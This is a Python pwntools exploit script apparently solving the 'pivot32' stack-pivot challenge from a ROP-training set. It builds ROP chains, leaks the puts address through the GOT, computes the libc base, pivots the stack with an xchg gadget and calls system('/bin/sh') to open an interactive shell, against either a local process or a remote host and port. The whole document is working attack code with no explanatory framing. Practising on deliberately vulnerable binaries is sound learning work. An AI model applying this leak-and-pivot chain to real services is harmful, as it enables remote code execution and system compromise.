from pwn import *

"""
Run locally with:
./exploit.py LOCAL
Run against remote with:
./exploit.py HOST=x.x.x.x PORT=xxxxx
"""

splash()
elf = context.binary = ELF("./pivot32")
libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)



class ROPS:
    pop_ret     = 0x080484a9
    stack_pivot = 0x0804882e # xchg esp, eax; ret;
    pop_eax     = 0x0804882c


def conn():
    if args.LOCAL:
        pty = process.PTY
        return process(elf.path, stdin=pty, stdout=pty, stderr=pty)
    else:
        return remote(args.HOST, args.PORT)


def solve():
    io = conn()

    io.recvuntil(b"you a place to pivot: ")
    pivot_point = int(io.recvline()[:-1], 16)
    log.info(f"Pivot point 1: {hex(pivot_point)}")

    input("PAUSE...")

    payload_1 = [
        elf.plt.puts,
        ROPS.pop_ret,
        elf.got.puts,
        elf.sym.main
    ]

    pivot_1 = [
        cyclic(44),
        ROPS.pop_eax,
        pivot_point,
        ROPS.stack_pivot,
    ]

    io.sendafter(b"> ", flat(payload_1))
    io.sendafter(b"> ", flat(pivot_1))

    # Extracts puts libc address then calculates libc base
    io.recvuntil(b"Thank you!\n")
    puts_addr = int.from_bytes(io.recv(4), "little")
    libc.address = puts_addr - libc.sym.puts
    log.debug(f"puts address: {hex(puts_addr)}")
    log.info(f"LIBC base: {hex(libc.address)}")

    # Extracts second pivot point
    io.recvuntil(b"you a place to pivot: ")
    pivot_point = int(io.recvline()[:-1], 16)
    log.info(f"Pivot point 2: {hex(pivot_point)}")

    payload_2 = [
        libc.sym.system,
        libc.sym.exit,
        next(libc.search(b"/bin/sh"))
    ]

    pivot_2 = [
        cyclic(44),
        ROPS.pop_eax,
        pivot_point,
        ROPS.stack_pivot,
    ]

    io.sendafter(b"> ", flat(payload_2))
    io.sendafter(b"> ", flat(pivot_2))

    io.interactive()


if __name__ == "__main__":
    solve()